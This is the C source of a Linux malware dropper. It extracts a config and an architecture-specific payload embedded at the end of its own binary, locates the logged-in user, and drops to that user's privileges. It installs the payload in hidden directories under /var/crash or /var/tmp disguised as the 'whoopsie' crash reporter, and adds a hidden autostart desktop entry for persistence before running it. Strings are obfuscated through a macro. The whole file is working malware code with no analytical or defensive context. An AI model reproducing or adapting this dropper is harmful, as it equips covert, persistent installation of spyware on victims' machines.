/*
   DROPPER FORMAT
   --------------

    [n] dropper
   [16] MARKER
    [8] TAG
    [4] j (little endian) [config size]
    [j] config
    [4] i (little endian) [core32 size]
    [i] core32
    [4] i (little endian) [core64 size]
    [i] core64
   [16] MARKER
    [4] n (little endian) [dropper size]
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pwd.h>
#include <glob.h>
#include <fcntl.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>

#include "so.h"

#define MARKER "BmFyY5JhOGhoZjN1"

struct passwd *getuser(void);
int main(void);

struct passwd *getuser(void)
{
   struct passwd *p = NULL;
   char *env = NULL, *tok1 = NULL, *tok2 = NULL, buf[512];
   FILE *fp = NULL, *pp = NULL;
   uid_t uid;
   pid_t ppid;
   struct stat s;
   glob_t g = {0};
   int i;

   do {
      if((uid = getuid()) && (p = getpwuid(uid))) break;

      if((env = getenv(SO"SUDO_USER")) && strcmp(env, SO"root") && (p = getpwnam(env))) break;

      if((env = getenv(SO"USERNAME")) && strcmp(env, SO"root") && (p = getpwnam(env))) break;

      if((env = getenv(SO"USER")) && strcmp(env, SO"root") && (p = getpwnam(env))) break;

      if((env = getenv(SO"DEBCONF_PIPE")) && !stat(env, &s) && s.st_uid && (p = getpwuid(s.st_uid))) break;

      do {
         if(!(env = getenv(SO"DEBCONF_PIPE")) || (snprintf(buf, sizeof(buf), SO"%s-*", env) >= sizeof(buf))) break;
         if(glob(buf, GLOB_NOSORT, NULL, &g)) break;
         for(i = 0, uid = 0; i < g.gl_pathc; i++) {
            if(stat(g.gl_pathv[i], &s) || !s.st_uid) continue;
            if(uid && (uid != s.st_uid)) break;
            if(!uid) uid = s.st_uid;
         }
         if(i != g.gl_pathc) break;
         if(uid) p = getpwuid(uid);
      } while(0);
      globfree(&g);
      if(p) break;

      do {
         if(!(pp = popen(SO"who -q", "r"))) break;
         if(!fgets(buf, sizeof(buf), pp)) break;
         if(buf[0] && (buf[strlen(buf) - 1] == '\n')) buf[strlen(buf) - 1] = '\0';
         for(tok1 = strtok(buf, " "), tok2 = NULL; tok1; tok2 = tok1, tok1 = strtok(NULL, " ")) if(tok2 && strcmp(tok2, tok1)) break;
         if(tok1) break;
         p = getpwnam(tok2);
      } while(0);
      if(pp) pclose(pp);
      if(p) break;

      for(ppid = getppid(); ppid > 1;) {
         if(snprintf(buf, sizeof(buf), SO"/proc/%d/stat", ppid) >= sizeof(buf)) break;
         if(stat(buf, &s)) break;
         if((s.st_uid) && (p = getpwuid(s.st_uid))) break;
         if(!(fp = fopen(buf, "r"))) break;
         if(fscanf(fp, SO"%*d %*s %*s %d", &ppid) != 1) { fclose(fp); break; }
         fclose(fp);
      }
      if(p) break;
   } while(0);

   return p;
}

int main(void)
{
   int uid, gid;
   int arch = 0;
   struct utsname uts;
   struct passwd *p = NULL;
   struct stat s;
   FILE *dropper = NULL, *core = NULL, *config = NULL, *desktop = NULL;
   char *marker = MARKER, test[sizeof(MARKER) - 1], tag[9], buf[100 * 1024], path[256], installdir[256];
   unsigned int i, size, ret = 0;
   pid_t pid;
   int lock;

   so();

   do {
      if(uname(&uts)) break;
      arch = (strcmp(uts.machine, SO"x86_64") ? 32 : 64);

      if(!(p = getuser())) break;
      uid = p->pw_uid;
      gid = p->pw_gid;
      setenv(SO"USER", p->pw_name, 0);
      setenv(SO"HOME", p->pw_dir, 0);
      setenv(SO"DISPLAY", SO":0.0", 0); /* XXX determinare il corretto display dell'utente */

      if(!(dropper = fopen(SO"/proc/self/exe", "r"))) break;

      setgid(gid);
      setuid(uid);

      if(fseek(dropper, -((sizeof(MARKER) - 1) + sizeof(unsigned int)), SEEK_END)) break;
      if(!fread(test, sizeof(MARKER) - 1, 1, dropper)) break;
      for(i = 0; ((i < (sizeof(MARKER) - 1)) && (marker[i] == test[i])); i++);
      if(i != (sizeof(MARKER) - 1)) break;

      if(!fread(&size, sizeof(unsigned int), 1, dropper)) break;

      if(fseek(dropper, size, SEEK_SET)) break;
      if(!fread(test, sizeof(MARKER) - 1, 1, dropper)) break;
      for(i = 0; ((i < (sizeof(MARKER) - 1)) && (marker[i] == test[i])); i++);
      if(i != (sizeof(MARKER) - 1)) break;

      if(!fread(tag, sizeof(tag) - 1, 1, dropper)) break;
      tag[sizeof(tag) - 1] = '\0';

      do {
         if((snprintf(installdir, sizeof(installdir), SO"/var/crash/.reports-%u-%s", uid, tag) < sizeof(installdir)) && (!stat(installdir, &s) || !mkdir(installdir, 0750))) break;
         if((snprintf(installdir, sizeof(installdir), SO"/var/tmp/.reports-%u-%s", uid, tag) < sizeof(installdir)) && (!stat(installdir, &s) || !mkdir(installdir, 0750))) break;
         installdir[0] = '\0';
      } while(0);
      if(!installdir[0]) break;

      if(snprintf(path, sizeof(path), SO"%s/.lock", installdir) >= sizeof(path)) break;
      if((lock = open(path, O_WRONLY|O_CREAT, 0600)) == -1) break;
      if(flock(lock, LOCK_EX|LOCK_NB)) break;
      close(lock);

      if(!fread(&size, sizeof(unsigned int), 1, dropper)) break;
      if(snprintf(path, sizeof(path), SO"%s/.cache", installdir) >= sizeof(path)) break;
      if(!(config = fopen(path, "w"))) break;
      while(size) {
         if(!fread(buf, (size > sizeof(buf)) ? sizeof(buf) : size, 1, dropper)) break;
         if(!fwrite(buf, (size > sizeof(buf)) ? sizeof(buf) : size, 1, config)) break;
         size -= ((size > sizeof(buf)) ? sizeof(buf) : size);
      }
      fclose(config);
      if(size) {
         unlink(path);
         break;
      }

      if(arch == 64) {
         if(!fread(&size, sizeof(unsigned int), 1, dropper)) break;
         if(fseek(dropper, size, SEEK_CUR)) break;
      }

      if(!fread(&size, sizeof(unsigned int), 1, dropper)) break;
      if(snprintf(path, sizeof(path), SO"%s/whoopsie-report", installdir) >= sizeof(path)) break;
      if(!(core = fopen(path, "w"))) break;
      while(size) {
         if(!fread(buf, (size > sizeof(buf)) ? sizeof(buf) : size, 1, dropper)) break;
         if(!fwrite(buf, (size > sizeof(buf)) ? sizeof(buf) : size, 1, core)) break;
         size -= ((size > sizeof(buf)) ? sizeof(buf) : size);
      }
      fclose(core);
      if(size) {
         unlink(path);
         break;
      }
      chmod(path, 0755);

      if(snprintf(path, sizeof(path), SO"%s/.config", p->pw_dir) >= sizeof(path)) break;
      mkdir(path, 0700);
      if(snprintf(path, sizeof(path), SO"%s/.config/autostart", p->pw_dir) >= sizeof(path)) break;
      mkdir(path, 0700);

      if(snprintf(path, sizeof(path), SO"%s/.config/autostart/.whoopsie-%s.desktop", p->pw_dir, tag) >= sizeof(path)) break;
      if(!(desktop = fopen(path, "w"))) break;
      fprintf(desktop, SO"[Desktop Entry]%c", '\n');
      fprintf(desktop, SO"Type=Application%c", '\n');
      fprintf(desktop, SO"Exec=%s/whoopsie-report%c", installdir, '\n');
      fprintf(desktop, SO"NoDisplay=true%c", '\n');
      fprintf(desktop, SO"Name=whoopsie%c", '\n');
      fprintf(desktop, SO"Comment=Whoopsie Report Manager%c", '\n');
      fclose(desktop);

      snprintf(path, sizeof(path), SO"%s/whoopsie-report", installdir);
      if((pid = fork()) == -1) break;
      if(!pid) {
         fclose(dropper);
         execl(path, path, NULL);
      }

      ret = 1;
   } while(0);
   if(dropper) fclose(dropper);

   exit(ret ? EXIT_SUCCESS : EXIT_FAILURE);
}
